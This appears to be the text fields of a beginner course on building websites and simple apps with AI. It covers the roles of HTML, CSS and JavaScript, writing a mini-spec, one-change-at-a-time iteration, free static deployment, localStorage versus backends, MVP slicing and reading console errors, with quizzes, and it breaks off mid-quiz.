callout.title: You do not need complex frameworks to launch a gorgeous site!
callout.body: Developers love debating React, Next.js, and Astro, yet plain HTML + CSS + JavaScript opens instantly in any browser, never breaks from package updates, and takes seconds to publish for free.

sections.heading: Why knowing this 3-file map makes your AI prompts dramatically better
sections.body:
Once you know which file owns which job, talking to AI feels effortless:

• Want to change wording or add a Testimonials section? That is **HTML**.
• Want bigger headlines, a softer cream background, or cleaner phone spacing? That is **CSS**.
• Want a FAQ accordion to expand smoothly when clicked? That is **JavaScript**.

Instead of vaguely waving at the screen, you can guide AI right to the exact layer you want adjusted.

callout.title: A crystal-clear micro-edit request
callout.body: "In `styles.css`, increase the padding on all buttons so they feel easier to tap on mobile phones, and switch the accent color to teal `#06B6D4`. Keep the HTML text unchanged."

sections.heading: Previewing your site locally takes literally one click
sections.body: Here is a delightful secret many beginners do not realize: you do NOT need to buy a domain or upload anything just to test your website! Because web browsers (Chrome, Firefox, Safari, Edge) speak HTML, CSS, and JavaScript natively, opening `index.html` locally displays your real site right away—offline and free.

callout.title: Myth Buster: "You must pay $200/year for website builders to own a real site"
callout.body: Owning plain `index.html`, `styles.css`, and `script.js` files means YOU own your site 100% forever—no platform lock-in, no watermarks, and free static hosting options everywhere!

keyTakeaways: Every website combines three simple roles: HTML (structure/content), CSS (colors/fonts/layout), and JavaScript (interactive behavior).
`index.html` is the front door of a website folder—you can preview it locally in any browser before publishing.
Plain HTML, CSS, and JavaScript are fast, zero-maintenance, and ideal for your first AI-built sites.

quiz.question: You love the words and layout of your site, and now you want to adjust typography, button colors, and mobile spacing. Which layer controls how the website looks?
options: HTML (page structure and copy)
JavaScript (interactive logic)
CSS (styling and layout)
Git (snapshots)
quiz.explanation: CSS (Cascading Style Sheets) controls all visual styling—colors, typography, borders, spacing, dark mode, and responsive layout.

quiz.question: You must buy a paid web domain before you can preview your `index.html` website in a browser.
options: True
False
quiz.explanation: False! Any web browser can open your local `index.html` file directly for free while you build and iterate.

quiz.question: A friend wants a dynamic filterable pricing calculator with sleek mobile styling, and asks AI to build it "using only plain HTML tags with zero CSS and zero JavaScript." What will fall short?
options: Browsers refuse to render plain HTML unless it is hosted behind a paid custom domain.
HTML alone gives unstyled structure—CSS handles mobile styling and JavaScript powers live calculation.
Plain HTML files cannot display currency numbers or text inputs without a cloud backend database.
Removing CSS automatically prevents visitors from opening the webpage on Android or iPhone browsers.
quiz.explanation: HTML gives the skeleton, CSS makes it readable and mobile-friendly, and JavaScript powers interactive calculations—each layer plays a complementary role.

chapters.title: Writing a Clear Mini-Spec Instead of Vague Prompts
chapters.summary: Why do some AI-generated websites look generic and purple-neon while others look custom-crafted by a boutique studio? The entire difference happens in the 2-minute Mini-Spec you write first.

analogy.title: Sketching a Napkin Floor Plan Before Hiring the Builder
analogy.body: If you tell a builder "Build me a cool house," you will get whatever default cookie-cutter box they built last week. Spend two minutes sketching a napkin plan—"A sunny one-story cottage for two writers, big kitchen table, warm oak wood, huge windows facing the garden"—and suddenly the builder creates YOUR place on the first try.

sections.heading: Why "Build me a website for my cafe" fails
sections.body:
When you hand an AI a six-word prompt, it has to guess fifty unspoken design decisions: Who visits? Are you selling luxury wedding cakes or $3 filter coffee? Do you want dark futuristic neon or warm cream editorial? What buttons should appear?

Forced to guess everything, the model plays it safe and generates bland placeholder stock text ("Lorem ipsum", "Revolutionizing Synergy") with generic layouts.

callout.title: The 5-Part Mini-Spec Blueprint (copy this for any site!)
callout.body:
1. **Who & What**: "Bean & Book — a cozy neighborhood coffee & used-book shop in Pune."
2. **Primary Goal**: "Help locals see today’s menu, opening hours, and directions."
3. **Visual Vibe**: "Warm cream background, dark espresso text, sage green accents, editorial serif headings—calm and welcoming, never flashy neon."
4. **Exact Sections**: "Hero banner with hours, 4-item Signature Drinks grid, About Our Story card, Visit Us map/hours footer."
5. **Technical Rules**: "Plain responsive HTML/CSS/JS, works great on mobile phones, zero placeholder Lorem Ipsum text."

sections.heading: Real copy beats "Lorem Ipsum" every single time
sections.body: Notice rule #5 above: give the AI a couple of real details—your actual brand name, two real offerings, your real city or tagline—and explicitly forbid Lorem Ipsum! Real words let the AI size cards, headings, and buttons realistically instead of producing awkward empty boxes.

callout.title: Let AI interview you to write your Mini-Spec!
callout.body: Staring at a blank page? Type: *"I want to build a simple website for [my idea]. Ask me 5 quick questions about my audience, vibe, and sections, then turn my answers into a clean Mini-Spec before writing any HTML."*

sections.heading: Keeping scope joyfully small for Version 1
sections.body: A crisp 4-section single-page website that loads in half a second and looks gorgeous on phones beats a half-finished 12-page mega-portal every time. Nail your Hero, Core Offering, Trust/Story, and Call-to-Action first—you can always add extra pages after Version 1 shines!

callout.title: Myth Buster: "Longer prompts confuse AI"
callout.body: Messy, contradictory rambles confuse AI—well-organized bullet points make AI **dramatically** sharper! A clean 10-bullet Mini-Spec uses fewer than 250 tokens and saves ten rounds of frustrating revisions.

keyTakeaways: A 2-minute Mini-Spec covering Brand/Audience, Goal, Visual Vibe, Exact Sections, and Mobile Rules turns generic AI output into custom-crafted design.
Include real wording instead of Lorem Ipsum so layouts and buttons fit realistic content.
If you feel stuck writing a spec, ask AI to interview you with 5 short questions first.

quiz.question: Which set of details belongs in a clear Website Mini-Spec before asking AI to generate HTML?
options: Brand, audience, goal, visual vibe, exact sections, and mobile rules.
Your live cloud API key, database password, hosting login, and five pages of Lorem Ipsum text.
Only a single adjective like "modern" so the AI stays free to pick its favorite neon theme.
Exact pixel coordinates for every single word and punctuation mark on desktop and tablet screens.
quiz.explanation: Giving AI clear audience, goal, visual vibe, exact sections, and mobile-friendly constraints removes guesswork and yields bespoke results immediately.

quiz.question: You can ask AI to interview you with 5 quick questions and draft the Mini-Spec together before generating any website code.
options: True
False
quiz.explanation: True! Having AI interview you is one of the easiest ways for beginners to uncover missing details without staring at a blank page.

quiz.question: Vikram prompts: "Make an awesome modern website for my photography business with everything a photographer needs." He gets a purple sci-fi site with fake Latin text and a broken booking form. Why?
options: AI defaults to sci-fi layouts without a CSS reset.
Photo galleries require a paid server framework.
His temperature setting was too low, which forced the AI to copy an older template with Latin text.
His vague prompt gave no vibe, sections, or simple V1 scope.
quiz.explanation: A specific Mini-Spec ("Minimal warm white gallery, 6-photo grid, About bio, simple email contact button, no fake Latin text") immediately locks in clean, realistic results.

chapters.title: Iterating Live & Fixing Visual Bugs with AI
chapters.summary: Almost no great website is born perfect on prompt #1—the magic happens in tiny, joyful 30-second iterations! Learn how to inspect on desktop & mobile and steer AI like a creative director.

analogy.title: Sculpting Clay vs. Trying to Nail It in One Hammer Swing
analogy.body: Professional designers never expect Draft 1 to be final. Draft 1 puts the rough clay on the table; then you step back, squint at the shape, smooth one curve, widen the doorway, and brighten the glaze—one small adjustment at a time until it feels unmistakably yours.

sections.heading: The Golden Rule of Iteration: ONE change per prompt
sections.body:
Look at your first generated site and resist the urge to dump fifteen unrelated tweaks into one giant paragraph (*"Change the font, move the pricing cards, add a newsletter popup, invert dark mode, shrink the footer, and animate the logo"*). Asking for ten changes at once often breaks three things that already worked!

Instead, work like a calm creative director—**one crisp adjustment at a time**:
• Prompt 1: *"Make the hero headline larger and add more breathing room above the button."*
• Check preview -> Love it! -> Prompt 2: *"Add a 3-card Pricing section right below Features."*
• Check preview -> Love it! -> Save a Git checkpoint!

callout.title: Tell AI what NOT to touch
callout.body: Adding a tiny guardrail like *"Keep the header and colors exactly as they are; ONLY adjust the spacing inside the 3 feature cards"* stops the AI from accidentally redesigning sections you already love.

sections.heading: Always check BOTH Desktop AND Mobile previews
sections.body:
Over half of all real visitors will open your website link on a phone! A layout that looks spacious on a wide monitor can easily squish text or overflow sideways on a 390px phone screen.

Always flip to a **mobile viewport** (in your browser’s DevTools device toggle or by opening the preview on your actual phone) after every major section. Spot buttons touching each other or tiny text? Tell AI specifically: *"On mobile screens under 640px, stack the two columns vertically and give buttons full width."*

callout.title: Describing visual tweaks using everyday words
callout.body:
You never need fancy CSS jargon! Everyday phrases work wonderfully:
• "Add more white space around the cards"
• "Make the buttons pill-shaped with a soft shadow"
• "Increase contrast on the gray subtitle so it is easier to read"
• "Keep line length narrower so paragraphs are effortless to scan"

sections.heading: Using screenshots & Inspect Element to squash stubborn visual bugs
sections.body: If a stubborn spacing bug refuses to budge after one text description, snap a quick screenshot and show it to your AI—or right-click the awkward button in your browser, choose **Inspect**, and note the element’s label (like `.hero-cta`). Handing that tiny clue to AI turns a 20-minute puzzle into a 5-second fix.

callout.title: Avoid the "infinite polish spiral" before shipping
callout.body: Once your text is readable, links work, and mobile looks neat, publish Version 1! Real feedback from one friend beats two hours of debating whether a button should be 10px or 12px rounded.

keyTakeaways: Iterate calmly with ONE focused request per prompt—and explicitly tell AI which sections to leave untouched.
Always check both desktop and phone-sized viewports to catch squished columns or tiny tap targets early.
Plain-English design language ("more breathing room", "higher contrast", "stack vertically on phones") plus screenshots guide AI effortlessly.

quiz.question: What is the safest way to refine an AI-generated website without accidentally breaking sections you already like?
options: Bundle ten design tweaks into one prompt.
Delete the existing CSS file and ask the AI to regenerate the whole site from scratch on each edit.
Ask for one focused edit at a time and state what to keep unchanged.
Avoid saving Git checkpoints until every single button and color looks final.
quiz.explanation: Small, surgical one-change-at-a-time prompts let you verify each improvement cleanly and avoid unintended ripple effects.

quiz.question: You must know exact CSS property names like `flex-direction` or `border-radius` before asking AI to improve your website’s spacing or button shape.
options: True
False
quiz.explanation: False! Clear everyday phrases like "stack these cards vertically on phones" or "make the buttons pill-shaped with extra padding" translate directly into clean CSS.

quiz.question: Sara designs her portfolio on a wide monitor and shares the link immediately on social media without checking a phone viewport. Why might half her visitors struggle?
options: Social media apps automatically strip out `styles.css` from links opened inside mobile browsers.
Multi-column desktop layouts can squish or overflow sideways on phones unless checked and stacked cleanly.
Mobile browsers cannot load plain `index.html` pages unless you wrap them in a native mobile framework.
Responsive mobile layouts only activate after you purchase a custom `.com` domain name.
quiz.explanation: Always check a phone-sized viewport before shipping! A 10-second mobile check catches awkward wrapping, sideways scrolling, and tiny tap targets immediately.

chapters.title: Putting Your Website on the Internet for Free
chapters.summary: Turn your local `index.html` folder into a real public `https://` website anyone in the world can open—using free, beginner-friendly static hosts in less than two minutes.

analogy.title: Moving Muffins from Your Kitchen Counter to a Storefront Window
analogy.body: Right now, your website files live safely on your personal device—like freshly baked muffins sitting on your home kitchen counter. Only people in your kitchen can taste them. **Deployment** simply copies that clean folder onto an always-on server (a storefront window) with a public street address (`https://your-site.netlify.app`) so anyone on Earth can visit 24/7.

sections.heading: What actually happens when you "deploy" a static site
sections.body:
Publishing a website used to require renting mysterious servers, configuring firewalls, and paying monthly hosting fees. Today, publishing a static site (plain HTML + CSS + JavaScript) is completely **free** and takes under 60 seconds.

When you deploy, a hosting platform copies your clean folder onto fast servers around the globe and automatically wraps it in a secure padlock (`HTTPS`) so browsers trust your link immediately.

callout.title: Three rock-solid FREE ways to put your site online
callout.body:
1. **Netlify Drop** (`app.netlify.com/drop`): Drag and drop your clean website folder into the browser—instant live `https://` link in 15 seconds, zero Git needed.
2. **GitHub Pages**: Push your clean folder to a free GitHub repo and turn Settings -> Pages ON so every push auto-updates your site.
3. **Cloudflare Pages / Vercel**: Free global hosting with automatic preview links whenever you test edits.

sections.heading: Your 60-second pre-flight checklist before going live
sections.body:
Before sharing your new link with friends, family, or customers, run four quick sanity checks:

1. **Front door check**: Confirm your main file is named exactly `index.html` (lowercase!).
2. **Zero secrets check**: Confirm NO API keys, `.env` files, or frontend-exposed secret env vars sit inside the folder you upload.
3. **Broken link & image check**: Tap every navigation link and button once, and confirm all images load.
4. **Phone test**: Open the live link right on your phone to verify the real visitor experience!

callout.title: Remember: everything in a deployed website folder is public!
callout.body: Never drop personal documents, private notes, or `.env` secret files into the folder you deploy. Keep your upload folder strictly limited to the HTML, CSS, JS, and images meant for visitors.

sections.heading: Optional upgrade: connecting a custom domain later
sections.body: Free starter links like `bean-and-book.netlify.app` or `yourname.github.io` work wonderfully for portfolios, event invites, and side projects! If you ever want your own custom address like `beanandbook.com` (~$10–$12/year from registrars like Cloudflare Registrar or Porkbun), all three free hosts let you plug in a custom domain in two minutes while keeping static hosting $0/month.

callout.title: Celebrate shipping Version 1!
callout.body: The moment you text a real live `https://` link to a friend that YOU designed and shipped yourself, something clicks forever: you are no longer just a consumer of technology—you are a builder.

keyTakeaways: Deployment simply copies your clean website folder onto an always-on hosting server with a secure public `https://` URL.
You can host plain HTML/CSS/JS sites 100% free via Netlify Drop, GitHub Pages, Vercel, or Cloudflare Pages.
Always verify lowercase `index.html`, zero leaked secrets or `.env` files, working links, and phone layout before sharing.

quiz.question: What is the fastest zero-setup way to publish a clean folder containing `index.html`, `styles.css`, and `script.js` on the public internet for free?
options: Drag the clean folder onto a free static host like Netlify Drop.
Rent a dedicated cloud database server and configure manual SSL certificates from scratch.
Upload the folder together with your `.env` secrets so the host can authenticate visitors.
Convert the HTML and CSS files into a single PDF document and share a cloud drive link.
quiz.explanation: Free static hosts like Netlify Drop, GitHub Pages, and Cloudflare Pages publish your clean HTML/CSS/JS folder with free HTTPS in under a minute!

quiz.question: Because a website is hosted on Netlify or GitHub Pages, any `.env` file placed inside the uploaded static folder is automatically hidden from visitors.
options: True
False
quiz.explanation: False! Static web hosting serves uploaded files publicly—never put `.env` files, API keys, or private documents inside a folder you deploy.

quiz.question: Owen drags his finished website folder onto Netlify Drop, opens his new URL, and gets a "Page Not Found (404)" error. Inside his folder, the homepage is named `MyHomePage.html`. What caused the 404?
options: Static hosts reject folders mixing CSS and JavaScript.
Netlify Drop needs a paid custom `.com` domain first.
Filenames with capital letters are only supported on GitHub Pages, never on drag-and-drop hosts.
Static hosts look for lowercase `index.html` as the site’s entry page.
quiz.explanation: Every static host looks for lowercase `index.html` at the root of your folder as the landing page. Naming your main page `index.html` fixes the 404 immediately!

masteryCheck.title: Unit 6 Mastery Check
masteryCheck.subtitle: Confirm you can structure a Mini-Spec, steer web layers cleanly, and deploy without pitfalls.

questions.question: Your portfolio copy and layout are final, but the contact form needs email validation when tapped and buttons need larger mobile tap targets. Which two files should you ask AI to edit?
options: `script.js` for validation and `styles.css` for button sizing.
Only `.gitignore` for validation and `index.html` for every color rule.
Only `.env` for validation and `README.md` for mobile button padding.
`styles.css` for form validation logic and a cloud database for button spacing.
questions.explanation: JavaScript (`script.js`) handles interactive behavior like validation, while CSS (`styles.css`) controls sizing, spacing, and mobile styling.

questions.question: Before generating a cafe site, Priya prompts: "Build an amazing modern website for my cafe—add everything a restaurant might need." What is the quickest fix?
options: Add five pages of Lorem Ipsum to keep layout neutral.
Write a 5-part Mini-Spec naming audience, vibe, real sections, and mobile rules.
Switch from plain HTML/CSS to a complex backend framework before choosing colors.
Repeat the exact same one-line prompt at temperature 0.0 until the layout improves.
questions.explanation: A concise Mini-Spec with audience, goal, visual vibe, exact sections, real copy, and mobile rules prevents generic guesswork on prompt #1.

questions.question: You love your site’s header and pricing cards, and only want the footer links stacked cleanly on phones. How should you prompt the change?
options: Bundle ten unrelated font, color, and footer rewrites into a single big prompt.
Delete `styles.css` and ask AI to recreate every section from memory.
Request only the mobile footer stacking tweak and say to keep header/cards untouched.
Avoid checking a mobile viewport until after you purchase a custom `.com` domain.
questions.explanation: One focused change per prompt—plus explicitly stating what NOT to touch—prevents regressions in sections that already work.

questions.question: Before uploading a static site folder to Netlify Drop, Leo leaves `Home.HTML` as the landing file and leaves his `.env` file inside the folder. What two problems will hit immediately?
options: Netlify Drop charges $20/month and converts `Home.HTML` into a PDF.
Browsers hide `.env` safely, yet CSS stops loading on phones.
GitHub Pages is required for any static site folder containing both HTML and JavaScript files.
Visitors will hit a 404 (needs `index.html`), and `.env` gets served publicly.
questions.explanation: Static hosts require lowercase `index.html` as the root entry page AND serve uploaded files publicly—never place `.env` or private files inside a deployed folder!

modules.title: Build an App with AI
modules.subtitle: Step up from static pages to real interactive apps with state, storage, fearless debugging, and safe shipping.

chapters.title: Website vs. App: State, Storage & Backends Explained
chapters.summary: A brochure website shows the same page to everyone. A real app responds to taps, updates live data (State), and remembers it tomorrow (Storage). Learn when you need a backend—and when you do not!

analogy.title: The Printed Menu vs. The Live Order Whiteboard
analogy.body: A static website is a printed cafe menu taped in the window: every passerby reads the exact same dishes and prices. An **app** is the live order whiteboard inside the kitchen: customers add items, check off finished drinks, see updated totals instantly (**State**), and save today’s tallies in a ledger (**Storage**) so nothing vanishes if the power blinks.

sections.heading: What turns a webpage into a real app: State + Storage
sections.body:
You can build genuinely useful personal apps—Habit Trackers, Expense Splitters, Flashcard Decks, Pomodoro Timers, Budget Planners—using the exact same HTML, CSS, and JavaScript from Unit 6! Two new concepts power the leap:

• **State**: The app’s live memory right now (for example, your list of habits, which boxes are checked today, and your streak count). Whenever you tap a button, JavaScript updates State and immediately redraws the screen to match.
• **Storage**: Saving that State somewhere permanent so refreshing the browser does NOT wipe out your habits. For non-sensitive, single-person tools, your browser already includes **`localStorage`**—zero server required!

callout.title: Watching State and Storage team up
callout.body:
1. You type "Drink 2L Water" and tap Add.
2. JavaScript appends that habit to your `habits` array (**State**).
3. The UI redraws to display the new row.
4. JavaScript saves the updated list into `localStorage` (**Storage**) so tomorrow morning your habit is still right there!

sections.heading: Frontend vs. Backend: when do you actually need a server?
sections.body:
Beginners often assume every app requires cloud databases and login systems. Here is the clean boundary:

• **Frontend-only (HTML/CSS/JS + `localStorage`) is ENOUGH when**: The app is for one person on their own device storing non-sensitive data (Habit Tracker, Flashcards, Calculator, Dinner Splitter). Free, fast, and easy to build!
• **Add a Backend server + Database when**: Multiple people share data across devices, OR you need user logins, payments, or **paid AI API calls**—because secret API keys MUST stay server-side, never in browser code or `localStorage` (where CORS, XSS, and browser extensions expose them)!

callout.title: Never store secret API keys in browser code or `localStorage`
callout.body: A public web page should NEVER ship your secret API key—nor ask casual visitors to paste live API keys into browser `localStorage` where malicious scripts or extensions can read them. Keep paid keys on a backend server (or in trusted native/local apps using the OS keychain).

sections.heading: Meet "Backend-in-a-Box" when you are ready for Version 2
sections.body: Whenever your app outgrows `localStorage` and genuinely needs accounts or multi-device sync, platforms like **Supabase** or **Firebase** provide ready-made authentication and cloud databases. Just remember one critical security rule: **always enable strict access rules** (such as Row Level Security so users can only read and edit their own rows)—never leave a cloud database open to public read/write!

callout.title: Myth Buster: "An app only counts if it is in an app store"
callout.body: A responsive web app works on Android, iPhone, Linux, Mac, and Windows immediately from one link—and visitors can even tap "Add to Home Screen" so it launches with an icon like a native app!

keyTakeaways: Apps differ from brochure websites by managing live changing data (**State**) and persisting it across reloads (**Storage**).
Single-user personal tools storing non-sensitive data work wonderfully with browser `localStorage`—zero backend required.
Paid AI API keys, accounts, and shared data belong on a backend server with strict access rules (like Row Level Security)—never in public browser JS or `localStorage`.

quiz.question: If you build a Daily Habit Tracker and forget to save its state to `localStorage` (or a database), what happens when the user refreshes the page?
options: The browser automatically saves every checkbox inside `styles.css` as a fallback.
The user is redirected to a 404 page until a paid cloud database is connected.
Only habits added within the last sixty seconds are kept while older ones vanish.
All added habits and checkmarks reset back to the empty starting state.
quiz.explanation: In-memory State lives only while the page stays open. Saving State to `localStorage` (or a database) persists user data safely across page reloads!

quiz.question: Every interactive personal utility app—like a Flashcard deck or Dinner Bill Splitter—requires a paid cloud backend server and login screen.
options: True
False
quiz.explanation: False! Frontend-only apps using browser `localStorage` run completely free with zero servers and zero logins for non-sensitive personal utilities.

quiz.question: Priya builds a public AI web app and avoids setting up a backend by putting her OpenAI key into browser `localStorage`—or telling visitors to paste their own keys into `localStorage`. Spot the security problem.
options: Browser `localStorage` can only store numbers and rejects API keys containing hyphens.
HTTPS websites are legally prohibited from using `localStorage` unless a database is attached.
Browser code and `localStorage` are exposed to visitors, XSS, and extensions—keep paid keys server-side.
Putting a key in `localStorage` works safely only if you rename the file from `app.js` to `config.js`.
quiz.explanation: Anything in a browser (source files or `localStorage`) is exposed to the visitor, XSS scripts, and extensions—and many providers also block direct browser calls via CORS. Keep paid keys on a backend server (or OS keychain in trusted local apps).

chapters.title: Breaking an App Idea into Tiny MVP Steps
chapters.summary: The secret to building real apps with AI without getting overwhelmed is radical smallness: shrink your dream app into a tiny Minimum Viable Product (MVP) and stack one working slice at a time.

analogy.title: Build the Skateboard Before the Sports Car
analogy.body: Imagine wanting a better way to commute across town. If you spend six months manufacturing just one car door and one leather seat, you still have to walk to work! Build a simple rolling **skateboard** on Day 1 (MVP)—it gets you moving today. Next week add handlebars (scooter), then pedals (bicycle), and only later add the engine.

sections.heading: Why huge "build me Uber in one prompt" requests collapse
sections.body:
When beginners ask AI *"Build a full fitness app with user logins, social feed, AI meal scanner, push notifications, Stripe billing, and smartwatch sync,"* the AI tries to juggle twenty interlocking systems at once. Dozens of files appear, half the buttons are fake stubs, and when something breaks you have zero clue where to look.

Instead, top AI builders shrink the idea to its beating heart—the **MVP (Minimum Viable Product)**: the smallest working version that actually solves ONE core problem cleanly.

callout.title: Shrinking a "Dream Expense App" into a 15-minute MVP
callout.body:
Dream wish-list: Bank sync, receipt OCR camera, 12 currencies, group chats, monthly PDF tax exports.
**Crisp MVP (Version 1)**:
1. Add an expense (Item name + Amount + Who paid).
2. Show the clean list of expenses + total spent.
3. Calculate "Who owes whom" equally with one tap.
4. Save automatically in `localStorage` + a Reset Trip button.

sections.heading: The 3-Slice Build Ladder
sections.body:
Once your MVP fits on 4 bullet points, build it in three calm, testable slices—never jumping to Slice 2 until Slice 1 genuinely works when you tap it:

• **Slice 1 (Data + Core Action)**: Can I add an item and see it appear on screen?
• **Slice 2 (Persistence + Polish)**: Does it survive hitting Refresh (`localStorage`), let me delete/check off items, and look crisp on mobile?
• **Slice 3 (One Delightful Extra)**: Add a search filter, dark mode, CSV export, or summary card!

callout.title: Write a 3-line "Data Model" in plain English
callout.body: Telling AI what ONE item looks like works wonders: *"Each Habit item has: an `id`, a `name` (text), `completedToday` (true/false), and `streak` (number)."* Clear data shapes produce cleaner, more reliable apps!

sections.heading: Save a working checkpoint after EVERY single slice
sections.body: Finished Slice 1 and the Add button works smoothly? Check `git status` and save a clean Git commit! Now Slice 2 is stress-free—because even if Slice 2 gets weird, your working Slice 1 is safely locked in history.

callout.title: Myth Buster: "Simple MVPs feel cheap or boring"
callout.body: Think of the best tools you actually open every day—a crisp checklist, a clean timer, a fast bill splitter. People LOVE focused tools that do one job effortlessly without clutter!

keyTakeaways: An MVP (Minimum Viable Product) strips your idea down to the single core loop that actually solves the problem today.
Build in 3 small testable slices (Core Action -> Persistence & Polish -> One Delightful Extra), testing buttons after every slice.
Describing your item’s data fields in 2–3 lines of plain English makes AI-generated app code dramatically cleaner.

quiz.question: You want to build a Study Flashcards app with AI. Which scope is the best MVP for Version 1?
options: Multiplayer leaderboards, live voice tutoring rooms, Stripe subscriptions, and a 3D avatar store.
Add a card, tap to flip, mark known/again, and save locally.
A full cloud backend with accounts and admin panels first.
A static webpage with fifty hardcoded cards and no way to flip or track progress.
quiz.explanation: A focused V1 nails the real study loop immediately—you can actually study with it today and layer extra features on safely tomorrow!

quiz.question: You should test that Slice 1 works properly by tapping the buttons before asking AI to pile Slice 2 and Slice 3 on top.
options: True
False
quiz.explanation: True! Verifying each small slice keeps bugs tiny, obvious, and effortless to fix.

quiz.question: Marcus asks AI to generate a complete 15-feature restaurant booking platform in one single giant prompt, and gets tangled broken screens. What strategy would have succeeded?
options: Scoping a tiny 4-bullet MVP and building one tested slice at a time.
Re-prompting all 15 features at temperature 0.0.
Skipping `localStorage` and building a cloud database first.
Adding thirty more optional features to the prompt so the AI has richer context about the restaurant.
quiz.explanation: Big-bang prompts multiply complexity exponentially. Small MVP slices + plain-English data descriptions + testing each step is how reliable apps get built.

chapters.title: Debugging Without Knowing Code (Error Messages Are Clues!)
chapters.summary: Seeing red error text does not mean you failed—it means your computer just handed you a treasure map! Learn the calm 3-step debugging loop anyone can use without knowing how to code.

analogy.title: The Mechanic’s Check-Engine Code
analogy.body: When the check-engine light turns on in your car, you do not have to be a mechanical engineer to handle it. A scanner plugs in and prints an exact clue: `Code P0302: Spark plug cylinder 2 misfire`. Even if you have never held a wrench, handing that exact code to a mechanic saves hours of guessing. Browser console errors work the exact same way when handing clues to AI!

sections.heading: Red error text is your best friend, not an insult
sections.body:
Every beginner freezes the first time a button stops responding or a block of angry red text flashes in the Console. Take a slow breath and reframe it: **silent bugs are hard; loud red error messages are a gift!**

Inside any browser’s Developer Tools (**Console** tab), almost every error hands you three priceless facts:

1. **What went wrong** (e.g., `TypeError: Cannot read properties of null`)
2. **Which exact file** (e.g., `app.js`)
3. **Which exact line number** (e.g., `line 42`)

callout.title: Translating a scary error into plain English
callout.body:
Raw error: `TypeError: Cannot read properties of null (reading "value") at app.js:42`
Plain English: *"On line 42 of app.js, the code tried to read text from an input box it could not find—usually a small mismatch between the HTML ID and the JavaScript lookup!"*

sections.heading: The Calm 3-Step Non-Coder Debugging Loop
sections.body:
Whenever something breaks in an app you are building with AI, follow this exact 3-step recipe:

1. **Reproduce & Notice**: Write down the exact tap that broke it (*"When I leave the Amount box blank and tap Split, the total turns into `NaN`"*).
2. **Grab the Exact Clue**: Copy the exact red error message (removing any tokens/secrets if present) plus a screenshot if the layout looks strange.
3. **Ask AI to Diagnose FIRST, Patch SECOND**: Paste the error and say: *"Here is what I tapped and the exact error. First explain in 2 simple sentences why this happened, then apply the smallest possible fix without changing unrelated features."*

callout.title: Quick phone exercise: spot the bug from the clue
callout.body: If your console says `TypeError: Cannot read properties of null at app.js:42` right when you tap Submit, you already know where to look—line 42 of `app.js` is referencing an HTML element ID that does not match!

sections.heading: What to do if a fix does not work on try #1
sections.body:
If AI tries one fix and the bug is still there, do NOT keep pasting "still broken" five times. Give it fresher evidence!

• Ask it to add a temporary `console.log` print statement (never logging secrets!) so you can see what value the button actually received.
• Check if the browser is showing a cached old version (try a Hard Refresh).
• If a messy repair spiral starts, roll back cleanly to your last working Git commit and ask for a simpler approach!

callout.title: Watch out for "band-aid rewrites"
callout.body: If an AI proposes deleting and rewriting 300 lines of working code just to fix one broken button, pause and say: "Stop—keep the working parts and make a minimal targeted fix for line 42 only."

keyTakeaways: Console error messages are helpful diagnostic clues pointing directly to the file, line number, and cause—never something to fear.
Always give AI three inputs when debugging: exact steps you took, exact copied error text (redacted of any secrets), and a request for a plain-English diagnosis + minimal fix.
Use hard refresh, temporary `console.log` clues, or a clean Git rollback whenever a bug resists the first fix.

quiz.question: A button in your app stopped working. What is the single best thing to send your AI assistant so it fixes the real bug quickly?
options: Ask it to rewrite the whole app from scratch.
Raise temperature to 0.9 so the AI tries several creative new button layouts automatically.
Clear your Git commit history so older versions of the script do not confuse the browser.
Send the exact tap steps, verbatim console error, and ask for a minimal fix.
quiz.explanation: Exact reproduction steps plus the verbatim console error pinpoint the exact file and line immediately—turning guesswork into a surgical fix.

quiz.question: Opening the browser Developer Tools Console reveals exact error clues like file names and line numbers even if you do not know how to code.
options: True
